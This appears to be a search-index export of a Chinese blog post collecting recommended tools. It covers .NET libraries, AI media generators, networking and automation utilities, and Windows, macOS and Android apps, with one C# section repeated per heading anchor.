Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#枚举转字符串-source-generator"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#win-32"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#图片压缩"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#反编译-ilspy"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#硬件"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#浏览器"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#模拟数据"},{"categories":["blog"],"content":" 使用工具","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#使用工具"},{"categories":["blog"],"content":" 终端 终端共享, 多人操作 GitHub - ekzhang/sshx: Fast, collaborative live terminal sharing over the web GitHub - fathyb/carbonyl: Chromium running inside your terminal Textual 的终端 gui 库 k9s 是 kubectl 的终端 gui 工具 Terminal.Gui 是 csharp 的终端 gui 库 ratatui 是 rust 的 gui 库 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:1","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#终端"},{"categories":["blog"],"content":" 影音图像工具 照片卡通化 Photo to Anime Converter: AI Anime Filter Online 开源文生图 GitHub - bravekingzhang/text2video: 半个神器👉一键文本转视频的工具 免费无版权的图片 - 来自 AI StockCake: Captivating Free Images for Every Occasion 裸体检测 GitHub - infinitered/nsfwjs: NSFW detection on the client-side via TensorFlow.js Talk - Free group video call for the web 免费端到端的会议工具 AI 音乐 Mubert, 生成工作轻音乐 自己部署的图片管理器 GitHub - photoprism/photoprism: AI-Powered Photos App for the Decentralized Web 🌈💎✨ 类似 pornhub 的 logo 生成 Logoly.Pro —— A creative Logo Generator 基于 ai 的 logo 生成 Free Logo Maker | Make a New Logo in Minutes - Logomakerr.ai 开箱即用的 AI 图片生成 GitHub - lllyasviel/Fooocus: Focus on prompting and generating 图片生成自建, 非常容易使用 GitHub - lllyasviel/Fooocus: Focus on prompting and generating Carbon美化代码分享 字幕库 https://zimuku.org/ 生活照变好看的证件照 leap-ai/headshots-starter (github.com) 制作好看的 twitter 分享图片 Screenshot Tweet from URL (twittershots.com) 微软的设计工具. 可以生成图片, 添加文字 Microsoft Designer - Stunning designs in a flash 最知名的开源 AI 绘画软件stable-diffusion-webui 手机做电脑麦克风 WO Mic - FREE microphone (wolicheng.com) 跨平台开源的视频剪辑工具 olive-editor/olive: Free open-source non-linear video editor (github.com) 视频翻译, 唇纹合成. 文字转 AI 人工视频 AIFSH/MyHeyGen (github.com) AI 工具箱，可以合成语音，图片风格化等等 GitHub - Baiyuetribe/paper2gui: Convert AI papers to GUI，Make it easy and convenient for everyone to use artificial intelligence technology。让每个人都简单方便的使用前沿人工智能技术 0 样本的语音合成 GitHub - Plachtaa/VALL-E-X: An open source implementation of Microsoft’s VALL-E X zero-shot TTS model. Demo is available in https://plachtaa.github.io AI 壁纸 Vave BG - Unsplash but for background 文生图 - 快！ SDXL Turbo Free Online– Real-Time Stable Diffusion 把图片卡通化 Photo to Anime - Free AI Anime Filter with Privacy Protected 一个极简的本地“人声和背景音乐分离”工具 帮助你文字生成图片 绘图提示：AI驱动的提示生成器 音频格式的互相转换 GitHub - DannyBen/FlicFlac: Tiny portable audio converter for Windows (WAV FLAC MP3 OGG APE M4A AAC) 苹果设备 -AI 文生图 Amazing AI 使用特定人物的脸部，文生图 IP-Adapter-FaceID AI 使用特定任务的脸部生成图片 GitHub - InstantID/InstantID: InstantID : Zero-shot Identity-Preserving Generation in Seconds 🔥 图片转卡通化 AI figure to multi-style cartoon 图片高清，修复。wasm 技术 GitHub - lxfater/inpaint-web: A free and open-source inpainting \u0026 image-upscaling tool powered by webgpu and wasm on the browser。| 基于 Webgpu 技术和 wasm 技术的免费开源 inpainting \u0026 image-upscaling 工具, 纯浏览器端实现。 ai 抠图 ImageTools includes features such as remove the background of portraits, remove background from common objects, and replace background. 自建相册, 类似于 google 和 apple 的 photos GitHub - ente-io/ente: Fully open source, End to End Encrypted alternative to Google Photos and Apple Photos GitHub - immich-app/immich: Self-hosted photo and video backup solution directly from your mobile phone. GitHub - photoprism/photoprism: AI-Powered Photos App for the Decentralized Web 🌈💎✨ ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:2","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#影音图像工具"},{"categories":["blog"],"content":" 网络 虚拟局域网 https://github.com/y0ngb1n/dockerized/tree/master/tailscale , 对比 ipsec -vpn 的区别和使用? Ipsec 在网盘中有实例 ZeroTier | Global Area Networking 免费 frp Sakura Frp | 樱花内网穿透 — 免费内网穿透_免费端口映射_高速_高防节点_不限流量_Minecraft我的世界_微信开发调试_群辉NAS_无需公网_免备案 (natfrp.com) Portal Home - Just My Socks 搬瓦工官方, 感觉值得信任 ipv6转ipv4,动态域名, 计划任务等等 Releases · gdy666/lucky (github.com) 传输文件 「小白」苹果安卓隔空投送？跨生态万物互联？APP全指南_哔哩哔哩_bilibili ShareDrop 域名比价 namebeta.com 趣域网 domain265 域名查询 https://netcom.cm/unregDomains.php 让网络变差 GitHub - jagt/clumsy: clumsy makes your network condition on Windows significantly worse, but in a controlled and interactive manner. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:3","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#网络"},{"categories":["blog"],"content":" 虚拟国外 一个国外的电话卡. 可以漫游, 不被封禁, 代价可以接受 第二批新西兰 Skinny 卡到货出售 - 思有云 - IOIOX Google voice 保号方案 - V2EX 开一个美国公司 Stripe Atlas | 在特拉华州成立您的公司：C 类公司或有限责任公司 倍易付 虚拟信用卡 Vvacard 虚拟信用卡 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#虚拟国外"},{"categories":["blog"],"content":" 苹果 macos/ios 特色 免费跨平台的苹果生态视频播放器 VidHub -Video Library \u0026 Player on the App Store Tencent/lemon-cleaner: 腾讯柠檬清理是针对macOS系统的开源清理工具) 免越狱的游戏模拟器 rileytestut/Delta: Delta is an all-in-one classic video game emulator for non-jailbroken iOS devices. (github.com) altstoreio/AltStore: AltStore is an alternative app store for non-jailbroken iOS devices. (github.com) 免越狱的游戏商店。为了避免应用过期，需要一周内在同一个 wifi 下一次 macos 隐藏小图标 GitHub - dwarvesf/hidden: An ultra-light MacOS utility that helps hide menu bar icons ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:5","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#苹果-macosios-特色"},{"categories":["blog"],"content":" 安卓 zsh2401/AutumnBox: 图形化ADB工具箱 (github.com) GitHub - pppscn/SmsForwarder: 短信转发器——监控Android手机短信、来电、APP通知，并根据指定规则转发到其他手机：钉钉群自定义机器人、钉钉企业内机器人、企业微信群机器人、飞书机器人、企业微信应用消息、邮箱、bark、webhook、Telegram机器人、Server酱、PushPlus、手机短信等。包括主动控制服务端与客户端，让你轻松远程发短信、查短信、查通话、查话簿、查电量等。（V3.0 新增）PS.这个APK主要是学习与自用，如有BUG请提ISSUE，同时欢迎大家提PR指正 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:6","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#安卓"},{"categories":["blog"],"content":" Windows 特色 windows的初始化 微软官方出品的 windows 插件 microsoft/PowerToys: Windows system utilities to maximize productivity (github.com) 微软官方出品的进程查看工具 Process Explorer - Sysinternals | Microsoft Learn 文件占用, 快捷键, 进程管理等等 BlackINT3/OpenArk: OpenArk is an open source anti-rookit(ARK) tool for Windows. (github.com) LocalSend 文件传输工具 windows 优化工具 GitHub - hellzerg/optimizer: The finest Windows Optimizer 微软官方的 tcp 和 udp 连接信息查看工具 TCPView for Windows - Sysinternals | Microsoft Learn ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:7","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#windows-特色"},{"categories":["blog"],"content":" 办公 在线签署文件 GitHub - docusealco/docuseal: Open source DocuSign alternative. Create, fill, and sign digital documents ✍️ 透明水印工具 GitHub - guofei9987/text_blind_watermark: 文本盲水印：把信息隐匿到文本中，put invisible blind watermark into a text. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:8","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#办公"},{"categories":["blog"],"content":" 自动化 浏览器上编辑自动化操作, 自动打开/操作某页面, 打开标签, 下载图片, 截图等等 Automa - An extension for browser automation - Automa 安卓自动化任务 MacroDroid, 一些使用案例 https://sspai.com/post/83315 集简云无代码集成与AI人工智能平台-搭建企业自动化与智能化的商业流程 (jijyun.cn) 钉钉连接器 跳过开屏广告 Releases · zfdang/Android-Touch-Helper (github.com) eddlez/litiaotiao_package_backup: 李跳跳APK包备份 (github.com) gkd-kit/gkd: 基于 无障碍 + 高级选择器 + 订阅规则 的自定义屏幕点击 Android APP (github.com) 智能平移推窗器 - 领普Linptech,绿色全屋智能家居品牌。, 可接入米家 编码操作 web 页面 playwright 比较新，微软支持，支持的语言多 Selenium 比较老，教程多 puppeteer 主要是 nodejs，其他语言很多都停止支持 i 了。且只有 chrome 系列浏览器可以用 处理验证码 GitHub - QIN2DIM/hcaptcha-challenger: 🥂 Gracefully face hCaptcha challenge with MoE(ONNX) embedded solution. macos 特有 Alfred Workflow 进阶指南：以少数派标签搜索为例 ｜ 少数派会员 π+Prime 类似 IFTTT 对开发者更友好 GitHub - PipedreamHQ/pipedream: Connect APIs, remarkably fast. Free for developers. Site Unreachable ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:9","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#自动化"},{"categories":["blog"],"content":" 浏览器插件 查看 github 项目的技术站/TechStack 请稍候… 保存页面成一个 html 文件 SingleFile 拷贝中文没有被编码的 url copy-unicode-urls Howdz 起始页 GitHub - leon-kfd/Dashboard: Custom your personal browser start page from some 